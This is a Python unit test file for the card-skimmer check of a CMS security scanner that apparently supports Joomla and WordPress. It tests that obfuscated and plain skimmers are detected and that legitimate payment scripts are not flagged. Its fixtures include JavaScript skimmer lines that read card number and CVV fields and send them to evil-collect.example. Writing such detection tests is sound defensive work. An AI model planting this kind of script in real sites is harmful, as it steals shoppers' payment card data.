"""2.4.0 / Skimmer-Suche: Kartenfelder + Versand + fremde Adresse (+ Verschleierung); bekannte Zahlungsanbieter lösen nichts aus; rein lesend."""
import os
import sys
import tempfile
import threading
import unittest

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, HERE)
sys.path.insert(0, os.path.dirname(HERE))

import fixture  # noqa: E402
import wpfixture  # noqa: E402
from test_checks import ADV  # noqa: E402
from claudia.engine import Engine, Settings  # noqa: E402
from claudia.registry import load_all  # noqa: E402
from claudia.runner import LocalRunner  # noqa: E402

SKIMMER = ("var cc=document.querySelector('input[name=card_number]').value;var cv=document.getElementById('cvv').value;"
           "var u='https://evil-collect.example/x';eval(atob('" + "QUJD" * 30 + "'));var i=new Image();i.src=u+'?d='+cc+cv;")
PLAIN = "var cc=document.querySelector('input[name=card_number]').value;fetch('https://evil-collect.example/x',{method:'POST',body:cc});"
GOOD = "var cc=document.querySelector('input[name=card_number]').value;fetch('https://api.stripe.com/v1/tokens',{method:'POST',body:cc});"
OWN = "var cvv=document.getElementById('cvv').value;fetch('/checkout/pay',{method:'POST',body:cvv});"


def put(w, rel, data):
    p = os.path.join(w["site"], rel)
    os.makedirs(os.path.dirname(p), exist_ok=True)
    with open(p, "w") as fh:
        fh.write(data)


def run(w, cms="joomla"):
    load_all()
    eng = Engine(LocalRunner(w["home"], extra_path=w["bin"]), Settings(site_dir=w["site_rel"], url="https://shop.example/", log_dir="logs", opts={}, allow_hosts=[], cms=cms), ADV)
    return {r.id: r for r in eng.run(["skimmer_scan"], lambda e: None, threading.Event())}["skimmer_scan"]


def titles(r):
    return [(f.sev, f.title) for f in r.findings]


class Skimmer(unittest.TestCase):
    def test_clean_site_is_ok(self):
        w = fixture.make_world(tempfile.mkdtemp(prefix="claudia_sk_"), False)
        r = run(w)
        self.assertEqual(r.status, "ok", titles(r))

    def test_detects_obfuscated_skimmer_and_plain_exfil_but_not_stripe_or_own(self):
        w = fixture.make_world(tempfile.mkdtemp(prefix="claudia_sk_"), False)
        put(w, "media/checkout/pay.js", SKIMMER)
        put(w, "templates/x/js/plain.js", PLAIN)
        put(w, "plugins/system/shop/stripe.js", GOOD)
        put(w, "plugins/system/shop/own.js", OWN)
        snap = sorted(os.listdir(w["site"]))
        r = run(w)
        t = titles(r)
        crit = [f for f in r.findings if f.sev == "crit"]
        warn = [f for f in r.findings if f.sev == "warn"]
        self.assertTrue(crit and "media/checkout/pay.js" in " ".join(crit[0].items), t)
        self.assertTrue(warn and "plain.js" in " ".join(warn[0].items), t)
        allitems = " ".join(" ".join(f.items) for f in r.findings)
        self.assertNotIn("stripe.js", allitems)
        self.assertNotIn("own.js", allitems)
        self.assertEqual(snap, sorted(os.listdir(w["site"])))

    def test_works_for_wordpress_too(self):
        w = wpfixture.make_wp_world(tempfile.mkdtemp(prefix="claudia_skwp_"), False)
        put(w, "wp-content/plugins/pay/checkout.js", SKIMMER)
        r = run(w, "wordpress")
        self.assertTrue(any(s == "crit" for s, _ in titles(r)), titles(r))


if __name__ == "__main__":
    unittest.main()
